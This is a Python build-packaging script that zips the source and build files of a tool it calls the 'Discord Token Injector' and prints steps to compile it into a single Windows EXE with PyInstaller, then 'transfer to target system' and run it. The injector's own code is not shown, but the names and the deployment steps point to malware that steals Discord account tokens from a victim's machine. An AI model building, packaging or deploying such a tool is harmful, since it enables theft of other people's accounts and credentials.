#!/usr/bin/env python3
"""
Prepare Windows build package for distribution
Creates ZIP with all source, spec files, and build scripts ready for Windows
"""
import os
import shutil
import zipfile
from pathlib import Path

def create_windows_package():
    """Create ready-to-build package for Windows"""
    
    files_to_include = [
        'discord.py',
        'DiscordInjector.spec',
        'build_static.py',
        'build_windows.py',
        'build.bat',
        'BUILD_GUIDE.md',
    ]
    
    missing = [f for f in files_to_include if not os.path.exists(f)]
    if missing:
        print(f"[-] Missing files: {missing}")
        return False
    
    zip_name = 'discord-injector-windows-build.zip'
    
    print(f"[*] Creating {zip_name}...")
    
    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file in files_to_include:
                zf.write(file)
                print(f"  [+] {file}")
        
        size_mb = os.path.getsize(zip_name) / (1024*1024)
        print(f"\n[+] Package created: {zip_name} ({size_mb:.1f} MB)")
        print("[+] Ready to transfer to Windows machine")
        return True
    except Exception as e:
        print(f"[-] Failed to create package: {e}")
        return False

def print_instructions():
    """Print usage instructions"""
    print("""
╔════════════════════════════════════════════════════════════╗
║  Discord Token Injector - Windows Build                    ║
╚════════════════════════════════════════════════════════════╝

STEP 1: Transfer to Windows
  - Copy 'discord-injector-windows-build.zip' to Windows machine
  - Unzip the archive

STEP 2: Install Dependencies
  - Download Python 3.9+ from https://www.python.org/
  - During install, CHECK: "Add Python to PATH"

STEP 3: Build Executable
  Option A - Using batch script (easiest):
    > build.bat
    
  Option B - Using Python script:
    > python build_static.py
    
  Option C - Using PyInstaller directly:
    > pip install pyinstaller
    > pyinstaller --onefile --console discord.py

STEP 4: Test
  - Output: dist\\DiscordInjector.exe
  - Transfer to target system
  - Run: DiscordInjector.exe

═══════════════════════════════════════════════════════════════
BUILD DETAILS:
  - All dependencies bundled into single EXE
  - No external runtime required
  - ~9-15 MB executable
  - Cross-platform: Works on Windows 7, 10, 11
═══════════════════════════════════════════════════════════════
""")

if __name__ == '__main__':
    if create_windows_package():
        print_instructions()
    else:
        exit(1)
